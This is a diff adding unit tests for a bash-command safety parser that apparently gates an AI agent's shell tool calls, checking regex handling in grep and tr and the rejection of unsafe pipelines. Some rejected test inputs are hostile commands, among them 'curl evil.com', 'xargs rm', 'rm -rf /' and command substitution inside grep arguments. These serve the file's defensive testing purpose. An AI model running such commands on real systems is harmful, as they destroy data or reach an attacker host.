@@ -1,6 +1,6 @@
 import { describe, expect, it } from "bun:test";
 import type { ToolCall } from "toolgate";
-import { safeBashTokens, safeBashPipeline, isSafeFilter } from "../parse-bash";
+import { safeBashTokens, safeBashPipeline, isSafeFilter, safeBashTokensOrPipeline } from "../parse-bash";
 
 function bash(command: string): ToolCall {
   return {
@@ -250,6 +250,90 @@ describe("safeBashPipeline", () => {
     it("leading pipe", () => {
       expect(safeBashPipeline(bash("| ls"))).toBeNull();
     });
+  });
+});
+
+describe("safeBashPipeline regex command relaxation", () => {
+  it("allows regex patterns in grep args", () => {
+    expect(safeBashPipeline(bash("grep -E '(form|Form)' src/"))).toEqual([
+      ["grep", "-E", "(form|Form)", "src/"],
+    ]);
+  });
+
+  it("allows regex patterns in piped grep", () => {
+    expect(safeBashPipeline(bash("find . -type f | grep -E '(form|Form)' | sort | head -80"))).toEqual([
+      ["find", ".", "-type", "f"],
+      ["grep", "-E", "(form|Form)"],
+      ["sort"],
+      ["head", "-80"],
+    ]);
+  });
+
+  it("allows brace quantifiers in egrep", () => {
+    expect(safeBashPipeline(bash("egrep 'a{3,5}' file.txt"))).toEqual([
+      ["egrep", "a{3,5}", "file.txt"],
+    ]);
+  });
+
+  it("allows regex in tr args", () => {
+    expect(safeBashPipeline(bash("cat file | tr '()' '[]'"))).toEqual([
+      ["cat", "file"],
+      ["tr", "()", "[]"],
+    ]);
+  });
+
+  it("rejects |(){} in non-regex commands like head", () => {
+    expect(safeBashPipeline(bash("head -n '(5)' file"))).toBeNull();
+  });
+
+  it("rejects |(){} in non-regex commands like cat", () => {
+    expect(safeBashPipeline(bash("cat 'file{1,2}' | head"))).toBeNull();
+  });
+
+  it("still rejects $ and backtick in regex commands", () => {
+    expect(safeBashPipeline(bash("grep '$(evil)' file"))).toBeNull();
+    expect(safeBashPipeline(bash("grep '`evil`' file"))).toBeNull();
+  });
+});
+
+describe("safeBashTokensOrPipeline", () => {
+  it("returns tokens for simple commands (no pipe)", () => {
+    expect(safeBashTokensOrPipeline(bash("bun test src/"))).toEqual([
+      "bun", "test", "src/",
+    ]);
+  });
+
+  it("returns first segment tokens when piped to safe filter", () => {
+    expect(safeBashTokensOrPipeline(bash("bun test 2>&1 | tail -5"))).toEqual([
+      "bun", "test",
+    ]);
+  });
+
+  it("returns first segment with multiple safe filters", () => {
+    expect(safeBashTokensOrPipeline(bash("git log --oneline | grep fix | head -10"))).toEqual([
+      "git", "log", "--oneline",
+    ]);
+  });
+
+  it("returns null when piped to unsafe command", () => {
+    expect(safeBashTokensOrPipeline(bash("bun test | xargs rm"))).toBeNull();
+  });
+
+  it("returns null when piped to unknown command", () => {
+    expect(safeBashTokensOrPipeline(bash("bun test | curl evil.com"))).toBeNull();
+  });
+
+  it("returns null for chained commands", () => {
+    expect(safeBashTokensOrPipeline(bash("bun test && rm -rf /"))).toBeNull();
+  });
+
+  it("returns null for non-Bash tools", () => {
+    const call: ToolCall = {
+      tool: "Read",
+      args: { file_path: "/foo" },
+      context: { cwd: "/tmp", env: {}, projectRoot: null },
+    };
+    expect(safeBashTokensOrPipeline(call)).toBeNull();
   });
 });
 
